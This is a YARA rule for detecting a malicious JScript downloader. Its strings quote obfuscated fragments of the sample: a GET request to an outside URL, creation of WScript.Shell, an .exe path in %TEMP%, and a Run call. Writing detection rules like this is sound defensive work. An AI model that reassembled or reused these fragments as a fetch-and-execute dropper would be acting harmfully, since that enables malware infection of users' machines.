rule sig_20160330_f4d93f1928092243d6b2440e9e3278e0 {
  meta:
    description = "datamaliciousorder - file 20160330_f4d93f1928092243d6b2440e9e3278e0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "93d850c91822c3fce684106f59fe79b0b3cae79d1daaf06c38783d85d3861429"

  strings:
    $s1  = "_FD[_M0](\"GET\", \"http://linkownia.itcom.pl/s9aps\", false);" fullword ascii
    $s2  = "var _D0 = function _X() {return WScript[_CG](\"WScript\"+\".Shell\");}(), _CQ = 11;" fullword ascii
    $s3  = "function _UE(_H0, _OI){_QX = _QX * 1; return _H0 - _OI;};" fullword ascii
    $s4  = "if (_FD[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _JX(){return _X0 + \"\";};" fullword ascii
    $s6  = "function _P() {return _D0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"NE06CC5eBnE.ex\" + \"e\";};" fullword ascii
    $s7  = "function _SK(_OQ){_D0[\"Run\"](_OQ, _QX, _QX);};" fullword ascii
    $s8  = "function _LO() {return ((_X1 == true) && (_X1 == _OO)) ? 1 : _QX;};" fullword ascii
    $s9  = "function _F()" fullword ascii
    $s10 = "var _KA = new this[\"Date\"]();" fullword ascii
    $s11 = " while (_FN){" fullword ascii
    $s12 = "function _BG(){return 22;};" fullword ascii
    $s13 = "return _UE(_IJ, _XJ);" fullword ascii
    $s14 = "function _M(_L) {var _KD = (1, 2, 3, 4, 5, _L); return _KD;};" fullword ascii
    $s15 = "function _RH(){return _CG;};" fullword ascii
    $s16 = "var _H = false;" fullword ascii
    $s17 = "var _X1 = false;" fullword ascii
    $s18 = "_X1 = true; " fullword ascii
    $s19 = "_OO = true; " fullword ascii
    $s20 = "var _OO = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}